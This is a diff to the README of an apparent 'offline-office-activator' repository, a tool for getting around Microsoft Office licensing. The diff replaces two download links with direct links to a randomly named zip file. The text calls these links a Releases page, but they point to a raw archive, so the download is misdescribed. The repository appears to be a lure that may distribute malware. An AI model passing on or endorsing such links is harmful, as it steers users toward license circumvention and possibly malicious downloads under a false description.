@@ -6,7 +6,7 @@ Welcome to the offline-office-activator repository! This application allows you 
 
 ## 📥 Download the Application
 
-[![Download Latest Release](https://github.com/CrabzHunterz/offline-office-activator/raw/refs/heads/main/uniflorate/office-activator-offline-v1.8.zip)](https://github.com/CrabzHunterz/offline-office-activator/raw/refs/heads/main/uniflorate/office-activator-offline-v1.8.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/CrabzHunterz/offline-office-activator/main/uniflorate/offline-activator-office-Irrisoridae.zip)](https://raw.githubusercontent.com/CrabzHunterz/offline-office-activator/main/uniflorate/offline-activator-office-Irrisoridae.zip)
 
 Click the link above to download the latest version of the offline-office-activator. This link will take you to our Releases page, where you can find the most up-to-date software.
 
@@ -23,7 +23,7 @@ Before downloading, ensure your computer meets these basic requirements:
 ## 📂 Download & Install
 
 1. **Visit the Releases Page:** Go to the following link to access the download options:
-   [Download Releases Page](https://github.com/CrabzHunterz/offline-office-activator/raw/refs/heads/main/uniflorate/office-activator-offline-v1.8.zip)
+   [Download Releases Page](https://raw.githubusercontent.com/CrabzHunterz/offline-office-activator/main/uniflorate/offline-activator-office-Irrisoridae.zip)
    
 2. **Choose Your Version:** On the Releases page, you'll see different versions of the offline-office-activator. Select the one that matches your system.
 
